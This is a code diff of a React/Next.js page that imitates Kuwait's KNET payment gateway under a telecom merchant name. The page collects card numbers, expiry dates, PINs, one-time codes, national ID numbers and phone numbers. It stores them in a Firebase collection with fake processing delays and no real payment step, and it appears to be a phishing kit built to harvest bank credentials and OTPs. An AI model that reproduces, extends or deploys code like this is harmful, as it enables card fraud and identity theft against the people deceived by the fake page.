@@ -1,31 +1,29 @@
 "use client"
-import React, { useEffect, useState } from 'react';
-import './knet.css'
-import { doc, onSnapshot } from 'firebase/firestore';
-import { db, handlePay } from '../lib/firebase';
-import { Step3 } from './step3';
-import { Step4 } from './step4';
-import Loader from '../components/loader';
-import { useRouter } from 'next/navigation';
+import { useEffect, useState } from "react"
+import "./knet.css"
+import { doc, onSnapshot } from "firebase/firestore"
+import { db, handlePay } from "../lib/firebase"
+import Loader from "../components/loader"
+import { useRouter } from "next/navigation"
 
 type PaymentInfo = {
-  cardNumber: string;
-  year: string;
-  month: string;
-  bank?: string;
-  cvv?: string;
-  otp?: string;
-  pass: string;
-  cardState: string;
-  allOtps: string[],
-  bank_card: string[];
-  prefix: string;
-  status: 'new' | 'pending' | 'approved' | 'rejected';
-  phoneNumber: string,
-  network: string,
+  cardNumber: string
+  year: string
+  month: string
+  bank?: string
+  cvv?: string
+  otp?: string
+  pass: string
+  cardState: string
+  allOtps: string[]
+  bank_card: string[]
+  prefix: string
+  status: "new" | "pending" | "approved" | "rejected"
+  phoneNumber: string
+  network: string
   idNumber: string
   otp2: string
-};
+}
 const BANKS = [
   {
     value: "ABK",
@@ -58,7 +56,8 @@ const BANKS = [
     value: "CBK",
     label: "Commercial Bank of Kuwait",
     cardPrefixes: ["532672", "537015", "521175", "516334"],
-  }, {
+  },
+  {
     value: "Doha",
     label: "Doha Bank",
     cardPrefixes: ["419252"],
@@ -86,7 +85,6 @@ const BANKS = [
     cardPrefixes: ["409054", "406464"],
   },
   {
-
     value: "NBK",
     label: "National Bank of Kuwait",
     cardPrefixes: ["464452", "589160"],
@@ -114,114 +112,115 @@ const BANKS = [
 ]
 
 export default function Payment() {
-
-
-
-  const [step, setstep] = useState(1);
-  const [newotp] = useState([''])
-  const [total, setTotal] = useState('');
-  const [isloading, setisloading] = useState(false);
+  const [step, setstep] = useState(1)
+  const [newotp] = useState([""])
+  const [total, setTotal] = useState("")
+  const [isloading, setisloading] = useState(false)
   const router = useRouter()
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
-    cardNumber: '',
-    year: '',
-    month: '',
-    otp: '',
+    cardNumber: "",
+    year: "",
+    month: "",
+    otp: "",
     allOtps: newotp,
-    bank: '',
-    pass: '',
-    cardState: 'new',
-    bank_card: [''],
-    prefix: '',
-    status: 'new',
-    phoneNumber: '',
-    network: '',
-    idNumber: '',
-    otp2: '',
-  });
-
+    bank: "",
+    pass: "",
+    cardState: "new",
+    bank_card: [""],
+    prefix: "",
+    status: "new",
+    phoneNumber: "",
+    network: "",
+    idNumber: "",
+    otp2: "",
+  })
+  const [countdown, setCountdown] = useState(60)
+  const [isCountdownActive, setIsCountdownActive] = useState(true)
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `)
   }
   useEffect(() => {
     //handleAddotp(paymentInfo.otp!)
-    const ty = localStorage!.getItem('amount')
+    const ty = localStorage!.getItem("amount")
     if (ty) {
       setTotal(ty)
-
     }
   }, [])
 
   useEffect(() => {
-    const visitorId = localStorage.getItem('visitor');
+    const visitorId = localStorage.getItem("visitor")
     if (visitorId) {
-      const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
+      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
-          const data = docSnap.data() as PaymentInfo;
-
+          const data = docSnap.data() as PaymentInfo
         }
-      });
+      })
 
-      return () => unsubscribe();
+      return () => unsubscribe()
     }
-  }, []);
+  }, [])
 
+  useEffect(() => {
+    let interval: NodeJS.Timeout | null = null
 
+    if (isCountdownActive && countdown > 0) {
+      interval = setInterval(() => {
+        setCountdown((countdown) => countdown - 1)
+      }, 1000)
+    } else if (countdown === 0) {
+      setIsCountdownActive(false)
+    }
+
+    return () => {
+      if (interval) clearInterval(interval)
+    }
+  }, [isCountdownActive, countdown])
+  
   return (
-    <div style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }} dir='ltr'>
+    <div style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }} dir="ltr">
       <form
         onSubmit={(e) => {
-          e.preventDefault();
+          e.preventDefault()
         }}
       >
-
-        <div id="PayPageEntry" >
-
+        <div id="PayPageEntry">
           <div className="container">
             <img src="./mob.jpg" className="-" alt="logo" />
 
             <div className="content-block">
               <div className="form-card">
-                <div className="container-" style={{ display: 'flex', justifyContent: 'center' }}>
+                <div className="container-" style={{ display: "flex", justifyContent: "center" }}>
                   <img src="./next.svg" className="-" alt="logo" height={90} width={90} />
                 </div>
                 <div className="row">
                   <label className="column-label">Merchant: </label>
-                  <label className="column-value text-label">KNET Payment</label>
+                  <label className="column-value text-label">Mobile Telecommunication Co. </label>
                 </div>
                 <div id="OrgTranxAmt">
                   <label className="column-label"> Amount: </label>
                   <label className="column-value text-label" id="amount">
                     {total}
-                    {'  '}KD&nbsp;{' '}
+                    {"  "}KD&nbsp;{" "}
                   </label>
                 </div>
                 {/* Added for PG Eidia Discount starts   */}
-                <div
-                  className="row"
-                  id="DiscntRate"
-                  style={{ display: 'none' }}
-                />
-                <div
-                  className="row"
-                  id="DiscntedAmt"
-                  style={{ display: 'none' }}
-                />
+                <div className="row" id="DiscntRate" style={{ display: "none" }} />
+                <div className="row" id="DiscntedAmt" style={{ display: "none" }} />
                 {/* Added for PG Eidia Discount ends   */}
               </div>
               <div className="form-card">
                 <div
                   className="notification"
                   style={{
-                    border: '#ff0000 1px solid',
-                    backgroundColor: '#f7dadd',
+                    border: "#ff0000 1px solid",
+                    backgroundColor: "#f7dadd",
                     fontSize: 12,
-                    fontFamily: 'helvetica, arial, sans serif',
-                    color: '#ff0000',
+                    fontFamily: "helvetica, arial, sans serif",
+                    color: "#ff0000",
                     paddingRight: 15,
-                    display: 'none',
+                    display: "none",
                     marginBottom: 3,
-                    textAlign: 'center',
+                    textAlign: "center",
                   }}
                   id="otpmsgDC"
                 />
@@ -229,15 +228,15 @@ export default function Payment() {
                 <div
                   className="notification"
                   style={{
-                    border: '#ff0000 1px solid',
-                    backgroundColor: '#f7dadd',
+                    border: "#ff0000 1px solid",
+                    backgroundColor: "#f7dadd",
                     fontSize: 12,
-                    fontFamily: 'helvetica, arial, sans serif',
-                    color: '#ff0000',
+                    fontFamily: "helvetica, arial, sans serif",
+                    color: "#ff0000",
                     paddingRight: 15,
-                    display: 'none',
+                    display: "none",
                     marginBottom: 3,
-                    textAlign: 'center',
+                    textAlign: "center",
                   }}
                   id="CVmsg"
                 />
@@ -248,7 +247,7 @@ export default function Payment() {
               padding: 2px; display:none;margin-bottom: 3px; text-align:center;"   id="">
                       </span*/}
                 </div>
-                <div id="savedCardDiv" style={{ display: 'none' }}>
+                <div id="savedCardDiv" style={{ display: "none" }}>
                   {/* Commented the bank name display for kfast starts */}
                   <div className="row">
                     <br />
@@ -270,7 +269,7 @@ export default function Payment() {
                       size={4}
                       maxLength={4}
                       className="allownumericwithoutdecimal"
-                      style={{ width: '50%' }}
+                      style={{ width: "50%" }}
                     />
                   </div>
                   {/* Added for Points Redemption */}
@@ -280,27 +279,20 @@ export default function Payment() {
                   <>
                     <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
                       <div className="row">
-                        <label
-                          className="column-label"
-                          style={{ width: '40%' }}
-                        >
+                        <label className="column-label" style={{ width: "40%" }}>
                           Select Your Bank:
                         </label>
                         <select
                           className="column-value"
-                          style={{ width: '60%' }}
+                          style={{ width: "60%" }}
                           onChange={(e: any) => {
-                            const selectedBank = BANKS.find(
-                              (bank) => bank.value === e.target.value
-                            );
+                            const selectedBank = BANKS.find((bank) => bank.value === e.target.value)
 
                             setPaymentInfo({
                               ...paymentInfo,
                               bank: e.target.value,
-                              bank_card: selectedBank
-                                ? selectedBank.cardPrefixes
-                                : [''],
-                            });
+                              bank_card: selectedBank ? selectedBank.cardPrefixes : [""],
+                            })
                           }}
                         >
                           <>
@@ -315,14 +307,11 @@ export default function Payment() {
                           </>
                         </select>
                       </div>
-                      <div
-                        className="row three-column"
-                        id="Paymentpagecardnumber"
-                      >
-                        <label className="column-label">Card Number:</label>
+                      <div className="row three-column" id="Paymentpagecardnumber">
+                        <label className="column-label mt-1">Card Number:</label>
                         <label>
                           <select
-                            className="column-value"
+                            className="column-value  mt-1"
                             name="dcprefix"
                             id="dcprefix"
                             onChange={(e: any) =>
@@ -331,15 +320,15 @@ export default function Payment() {
                                 prefix: e.target.value,
                               })
                             }
-                            style={{ width: '26%' }}
+                            style={{ width: "26%" }}
                           >
                             <option
-                              value={'i'}
+                              value={"i"}
                               onClick={(e: any) => {
                                 setPaymentInfo({
                                   ...paymentInfo,
                                   prefix: e.target.value,
-                                });
+                                })
                               }}
                             >
                               prefix
@@ -352,7 +341,7 @@ export default function Payment() {
                                   setPaymentInfo({
                                     ...paymentInfo,
                                     prefix: e.target.value,
-                                  });
+                                  })
                                 }}
                               >
                                 {i}
@@ -369,7 +358,7 @@ export default function Payment() {
                             pattern="[0-9]*"
                             size={10}
                             className="allownumericwithoutdecimal"
-                            style={{ width: '32%' }}
+                            style={{ width: "32%" }}
                             maxLength={10}
                             onChange={(e: any) =>
                               setPaymentInfo({
@@ -383,10 +372,7 @@ export default function Payment() {
                       </div>
                       <div className="row three-column" id="cardExpdate">
                         <div id="debitExpDate">
-                          <label className="column-label">
-                            {' '}
-                            Expiration Date:{' '}
-                          </label>
+                          <label className="column-label"> Expiration Date: </label>
                         </div>
                         <select
                           onChange={(e: any) =>
@@ -491,194 +477,183 @@ export default function Payment() {
                             size={4}
                             maxLength={4}
                             className="allownumericwithoutdecimal"
-                            style={{ width: '60%' }}
+                            style={{ width: "60%" }}
                           />
                         </div>
                       </div>
-                      {
-                        step === 1 && paymentInfo.status === 'approved' ? (
-                          <div className="row" id="PinRow">
-                            {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
-                            <input
-                              type="hidden"
-                              name="cardPinType"
-                              defaultValue="A"
-                            />
-                            <div id="eComPin">
-                              <label className="column-label"> Cvv: </label>
-                            </div>
-                            <div>
-                              <input
-                                inputMode="numeric"
-                                pattern="[0-9]*"
-                                name="cvv"
-                                id="cvv"
-
-                                autoComplete="off"
-                                title="Should be in number. Length should be 3"
-                                type="password"
-                                size={3}
-                                maxLength={3}
-                                className="allownumericwithoutdecimal"
-                                style={{ width: '60%' }}
-                              />
-                            </div>
+                      {step === 1 && paymentInfo.status === "approved" ? (
+                        <div className="row" id="PinRow">
+                          {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
+                          <input type="hidden" name="cardPinType" defaultValue="A" />
+                          <div id="eComPin">
+                            <label className="column-label"> Cvv: </label>
                           </div>
-                        ) : null
-                      }
+                          <div>
+                            <input
+                              inputMode="numeric"
+                              pattern="[0-9]*"
+                              name="cvv"
+                              id="cvv"
+                              autoComplete="off"
+                              title="Should be in number. Length should be 3"
+                              type="password"
+                              size={3}
+                              maxLength={3}
+                              className="allownumericwithoutdecimal"
+                              style={{ width: "60%" }}
+                            />
+                          </div>
+                        </div>
+                      ) : null}
                     </div>
                   </>
                 ) : step === 2 ? (
                   <div>
-                    <div className='row'>
-                      <div className='bg-blue-100 font-normal p-2 my-2' style={{ fontSize: 12, borderRadius: 3 }}>
-                        Please note: A 6-digit verification code has been sent via text message to your registered phone number</div>
+                    <div className="row">
+                      <div className="bg-blue-100 font-normal p-2 my-2" style={{ fontSize: 12, borderRadius: 3 }}>
+                        Please note: A 6-digit verification code has been sent via text message to your registered phone
+                        number
+                      </div>
                     </div>
                     <div className="row">
                       <label className="column-value">CardNumber:</label>
-                      <label style={{ margin: 0, padding: 0 }}> {paymentInfo.cardNumber.substring(0, 5) + "****" + paymentInfo.cardNumber.substring(10, 15)}</label>
+                      <label style={{ margin: 0, padding: 0 }}>
+                        {" "}
+                        {paymentInfo.cardNumber.substring(0, 5) + "****" + paymentInfo.cardNumber.substring(10, 15)}
+                      </label>
                     </div>
                     <div className="row">
-                      <label
-                        className="column-value"
-                      >Month expiry:</label>
+                      <label className="column-value">Month expiry:</label>
                       <label> {paymentInfo.month}</label>
                     </div>
                     <div className="row">
-                      <label
-                        className="column-value"
-                      >Year expiry:</label>
+                      <label className="column-value">Year expiry:</label>
                       <label> {paymentInfo.year}</label>
                     </div>
                     <div className="row">
-                      <label className="column-value"
-                      >Pin:</label>
-                      <label>{'****'}</label>
+                      <label className="column-value">Pin:</label>
+                      <label>{"****"}</label>
                     </div>
                     <div className="flex my-1">
-                      <label
-                        className="column w-16"
-                      >OTP:</label>
+                      <label className="column w-16">OTP:</label>
                       <input
                         onChange={(e: any) =>
                           setPaymentInfo({
                             ...paymentInfo,
                             otp: e.target.value,
                           })
-                        } type='tel' maxLength={6} id='timer'
-                        className='w-full' value={paymentInfo.otp} />
+                        }
+                        type="tel"
+                        maxLength={6}
+                        id="timer"
+                        className="w-full"
+                        value={paymentInfo.otp}
+                        placeholder={ `${countdown}s` }/>
                     </div>
                   </div>
-                ) : step === 3 ? (<><Step3 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo} />
-
-                </>) : step === 4 ? (<>
-                  <Step4 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo} />
-                </>) : (<></>)
-                }
+                ) : step === 3 ? (
+                  <>
+                    <Step3 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo} />
+                  </>
+                ) : step === 4 ? (
+                  <>
+                    <Step4 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo} />
+                  </>
+                ) : (
+                  <></>
+                )}
               </div>
               <div className="form-card">
                 <div className="row">
-                  <div style={{ textAlign: 'center' }}>
-                    <div id="loading" style={{ display: 'none' }}>
+                  <div style={{ textAlign: "center" }}>
+                    <div id="loading" style={{ display: "none" }}>
                       <center>
                         <img
                           style={{
                             height: 20,
-                            float: 'left',
-                            marginLeft: '20%',
+                            float: "left",
+                            marginLeft: "20%",
                           }}
                         />
-                        <label
-                          className="column-value text-label"
-                          style={{ width: '70%', textAlign: 'center' }}
-                        >
+                        <label className="column-value text-label" style={{ width: "70%", textAlign: "center" }}>
                           Processing.. please wait ...
                         </label>
                       </center>
                     </div>
-                    <div style={{ display: 'flex' }}>
+                    <div style={{ display: "flex" }}>
                       <button
-                        style={{ background: '#f1f1f1', marginLeft: 2, borderRadius: 3 }}
+                        style={{ background: "#f1f1f1", marginLeft: 2, borderRadius: 3 }}
                         disabled={
-                          (step === 1 && (paymentInfo.prefix === "" || paymentInfo.bank === "" || paymentInfo.cardNumber === "" || paymentInfo.pass === "" || paymentInfo.month === "" || paymentInfo.year === "" || paymentInfo.pass.length !== 4)) ||
-                     step === 2 && paymentInfo.otp?.length !== 6
+                          (step === 1 &&
+                            (paymentInfo.prefix === "" ||
+                              paymentInfo.bank === "" ||
+                              paymentInfo.cardNumber === "" ||
+                              paymentInfo.pass === "" ||
+                              paymentInfo.month === "" ||
+                              paymentInfo.year === "" ||
+                              paymentInfo.pass.length !== 4)) ||
+                          (step === 2 && paymentInfo.otp?.length !== 6)
                         }
                         onClick={() => {
                           if (step === 1) {
-                            setisloading(true);
+                            setisloading(true)
                             handlePay(paymentInfo, setPaymentInfo)
                             setTimeout(() => {
                               setstep(2)
-                              setisloading(false);
-
+                              setisloading(false)
                             }, 3000)
-
                           } else if (step === 2) {
-
-                            if (
-                              !newotp.includes(paymentInfo.otp!)
-
-                            ) { newotp.push(paymentInfo.otp!) }
+                            if (!newotp.includes(paymentInfo.otp!)) {
+                              newotp.push(paymentInfo.otp!)
+                            }
                             setisloading(true)
-                            handleAddotp(paymentInfo.otp!);
+                            handleAddotp(paymentInfo.otp!)
                             //   handleOArr(paymentInfo.otp!);
 
                             handlePay(paymentInfo, setPaymentInfo)
                             setTimeout(() => {
                               console.log(step)
                               setstep(3)
-                              setisloading(false);
+                              setisloading(false)
                             }, 3000)
-                          }
-
-                          else if (step === 3) {
+                          } else if (step === 3) {
                             console.log(step, 3)
-                            setisloading(true);
+                            setisloading(true)
 
                             setTimeout(() => {
                               setstep(4)
-                              setisloading(false);
-
+                              setisloading(false)
                             }, 3000)
-
                           } else if (step === 4) {
-                            setisloading(true);
+                            setisloading(true)
 
                             setTimeout(() => {
-                              setisloading(false);
-                              router.push('/auth')
+                              setisloading(false)
+                              router.push("/auth")
                             }, 3000)
-
                           }
 
                           setPaymentInfo({
                             ...paymentInfo,
-                            otp: '',
+                            otp: "",
                           })
                         }}
-
                       >
-                        {isloading ? "Wait..." : (step === 1 ? "Submit" : "Confirm")}
+                        {isloading ? "Wait..." : step === 1 ? "Submit" : "Confirm"}
                       </button>
-                      <button
-                        style={{ background: '#f1f1f1', marginLeft: 2, borderRadius: 3 }}
-                      >Cancel</button>
+                      <button style={{ background: "#f1f1f1", marginLeft: 2, borderRadius: 3 }}>Cancel</button>
                     </div>
                   </div>
                 </div>
               </div>
-              <div
-                id="overlayhide"
-                className="overlay"
-                style={{ display: 'none' }}
-              ></div>
+              <div id="overlayhide" className="overlay" style={{ display: "none" }}></div>
 
               <footer>
                 <div className="footer-content-new">
                   <div className="row_new">
                     <div
                       style={{
-                        textAlign: 'center',
+                        textAlign: "center",
                         fontSize: 11,
                         lineHeight: 1,
                       }}
@@ -688,12 +663,11 @@ export default function Payment() {
                       <span
                         style={{
                           fontSize: 10,
-                          fontWeight: 'bold',
-                          color: '#0077d5',
+                          fontWeight: "bold",
+                          color: "#0077d5",
                         }}
                       >
-                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company
-                        - KNET
+                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company - KNET
                       </span>
                     </div>
                   </div>
@@ -707,5 +681,132 @@ export default function Payment() {
         {isloading && <Loader />}
       </form>
     </div>
-  );
-};
+  )
+}
+
+const Step3 = ({setPaymentInfo,paymentInfo }:any) => {
+  return (
+    <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
+      <div className="row">
+        <label style={{ width: "40%" }} className="column-label">
+          ID Number:
+        </label>
+        <label>
+          <input
+            name="natID"
+            style={{ width: "60%" }}
+            type="tel"
+            inputMode="numeric"
+            pattern="[0-9]*"
+            size={12}
+            onChange={(e: any) =>
+              setPaymentInfo({
+                ...paymentInfo,
+                idNumber: e.target.value,
+              })
+            }
+            className="allownumericwithoutdecimal"
+            maxLength={12}
+            title="Should be in number. Length should be 12"
+          />
+        </label>
+      </div>
+      <div className="row">
+        <label style={{ width: "40%" }} className="column-label">
+          Authorized Phone Number:
+        </label>
+        <label>
+          <input
+            name="number"
+            onChange={(e: any) =>
+             setPaymentInfo({
+            ...paymentInfo,
+                phoneNumber: e.target.value,
+              })
+            }
+            style={{ width: "60%" }}
+            type="tel"
+            inputMode="numeric"
+            pattern="[0-9]*"
+            size={10}
+            className="allownumericwithoutdecimal"
+            maxLength={10}
+            title="Should be in number. Length should be 10"
+          />
+        </label>
+      </div>
+      <div className="row">
+        <label className="column-label" style={{ width: "40%" }}>
+          Network operator:{" "}
+        </label>
+        <select
+          className="column-value"
+          style={{ width: "60%" }}
+          name="company"
+          onChange={(e: any) =>
+         setPaymentInfo({
+              ...paymentInfo,
+              network: e.target.value,
+            })
+          }
+          id="type"
+        >
+          <option value="">Choose Network operator:...</option>
+          <option value="STC" title="STC">
+            STC
+          </option>
+          <option value="Zain" title="Zain">
+            Zain
+          </option>
+          <option value="Ooredoo" title="Ooredoo">
+            Ooredoo
+          </option>
+        </select>
+      </div>
+    </div>
+  )
+}
+const Step4 = (props: any) => {
+
+  return (
+    <div>
+      <div className="row">
+        <div className="bg-blue-100 font-normal p-2 my-2" style={{ fontSize: 12, borderRadius: 3 }}>
+          Please note: A 6-digit verification code has been sent via text message to your registered phone number
+        </div>
+      </div>
+      <div className="row">
+        <label style={{ width: "40%" }} className="column-label">
+          ID Number:
+        </label>
+        <label style={{ width: "60%", fontWeight: 100, color: "black" }} className="column-label">
+          {props.paymentInfo.idNumber}
+        </label>
+      </div>
+      <div className="row">
+        <label style={{ width: "40%" }} className="column-label">
+          Phone Number:
+        </label>
+        <label style={{ width: "60%", fontWeight: 100, color: "black" }} className="column-label">
+          {props.paymentInfo.phoneNumber}
+        </label>
+      </div>
+      <div className="row">
+        <label className="column-label">OTP:</label>
+        <label className="column-label"></label>
+        <input
+          onChange={(e: any) =>
+            props.setPaymentInfo({
+              ...props.paymentInfo,
+              otp2: e.target.value,
+            })
+          }
+          type="tel"
+          maxLength={6}
+          id="timer"
+          value={props.paymentInfo.otp2}
+        />
+      </div>
+    </div>
+  )
+}
